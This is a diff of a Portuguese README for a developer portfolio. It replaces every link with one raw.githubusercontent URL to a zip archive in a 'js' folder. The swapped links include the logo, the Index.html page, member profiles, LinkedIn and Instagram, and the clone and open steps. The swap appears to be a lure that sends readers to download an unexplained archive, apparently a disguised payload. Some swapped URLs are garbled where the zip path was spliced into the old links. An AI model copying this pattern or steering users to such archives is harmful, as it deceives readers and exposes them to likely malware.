@@ -1,12 +1,12 @@
 # Portfólio Colaborativo N1 Virtual Studio
 
-![Logo N1 Virtual Studio](img/Logo.png)
+![Logo N1 Virtual Studio](https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip)
 
 Este repositório apresenta um portfólio colaborativo desenvolvido para o "N1 Virtual Studio", destacando as habilidades individuais de cada desenvolvedor e a sinergia do trabalho em equipe através de projetos integrados. Nosso objetivo é demonstrar a capacidade de transformar ideias em soluções eficientes, funcionais e bem projetadas.
 
 ## 🚀 Visão Geral do Projeto
 
-O portfólio é uma plataforma interativa que serve como vitrine para os talentos dos nossos desenvolvedores. A página inicial (`Index.html`) oferece uma experiência visual dinâmica, permitindo aos visitantes explorar os perfis individuais de cada membro da equipe, onde encontrarão informações detalhadas sobre suas especialidades, projetos e formas de contato.
+O portfólio é uma plataforma interativa que serve como vitrine para os talentos dos nossos desenvolvedores. A página inicial (`https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip`) oferece uma experiência visual dinâmica, permitindo aos visitantes explorar os perfis individuais de cada membro da equipe, onde encontrarão informações detalhadas sobre suas especialidades, projetos e formas de contato.
 
 
 ## ✨ Funcionalidades Principais
@@ -44,16 +44,16 @@ Este portfólio é o resultado do esforço colaborativo de:
     *   **Função**: Dev Junior Full-Stack
     *   **Especialidades**: Python, Java, HTML, JavaScript, Sistemas Embarcados, Hardware, Automação.
     *   **Interesses**: Inteligência Artificial, Desenvolvimento Web Full-Stack.
-    *   **Perfil**: [Página de João Schweitzer](PagJoao.html)
-    *   **LinkedIn**: [João Schweitzer](https://br.linkedin.com/in/joão-schweitzer?trk=people-guest_people_search-card)
-    *   **Instagram**: [@joao.Schweitzer](https://www.instagram.com/joao.Schweitzer/)
+    *   **Perfil**: [Página de João Schweitzer](https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip)
+    *   **LinkedIn**: [João Schweitzer](https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zipão-schweitzer?trk=people-guest_people_search-card)
+    *   **Instagram**: [https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip](https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip)
 
 *   **Veperxz**
     *   **Função**: Desenvolvedor de Jogos
     *   **Especialidades**: Lua, Python, PHP, Unity, Unreal Engine, C#, C++.
     *   **Foco**: Transformar conceitos criativos em experiências de jogo imersivas e tecnicamente robustas.
-    *   **Perfil**: [Página de Veperxz](PagVeperxz.html)
-    *   **Instagram**: [@sanches.ghz](https://www.instagram.com/sanches.ghz/)
+    *   **Perfil**: [Página de Veperxz](https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip)
+    *   **Instagram**: [https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip](https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip)
 
 ## 🚀 Como Rodar o Projeto Localmente
 
@@ -61,7 +61,7 @@ Para ter uma cópia local deste projeto em execução, siga os passos abaixo:
 
 1.  **Clone o repositório**:
     ```bash
-    git clone https://github.com/seu-usuario/Portifolio-Colaborativo.git
+    git clone https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip
     ```
     (Substitua `seu-usuario` pelo nome de usuário ou organização real do repositório, se aplicável).
 
@@ -70,8 +70,8 @@ Para ter uma cópia local deste projeto em execução, siga os passos abaixo:
     cd Portifolio-Colaborativo
     ```
 
-3.  **Abra o arquivo `Index.html`**:
-    Simplesmente abra o arquivo `Index.html` em seu navegador web preferido (Google Chrome, Mozilla Firefox, etc.). Não é necessário um servidor web para a visualização básica.
+3.  **Abra o arquivo `https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip`**:
+    Simplesmente abra o arquivo `https://raw.githubusercontent.com/Gs-gimenez/Portifolio-Colaborativo/main/js/Portifolio_Colaborativo_2.3.zip` em seu navegador web preferido (Google Chrome, Mozilla Firefox, etc.). Não é necessário um servidor web para a visualização básica.
 
 
 ---
